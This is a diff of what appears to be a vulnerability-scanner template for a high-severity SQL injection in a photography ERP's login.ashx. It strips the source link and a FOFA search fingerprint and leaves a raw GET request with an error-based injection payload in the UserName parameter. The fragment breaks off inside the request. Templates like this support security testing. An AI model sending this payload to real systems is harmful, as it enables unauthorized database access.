@@ -3,12 +3,8 @@ info:
   name: 恒友摄影ERP login.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lyd8701a2e9zgamy'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lyd8701a2e9zgamy
-    fofa: body="BookChooseDateOrder.html"
 http:
 - raw:
   - 'GET /ashx/login.ashx?Method=ValidateLogin&ShopID=F0&UserName=admin''+AND+1=@@VERSION--&UserPwd=1 HTTP/1.1
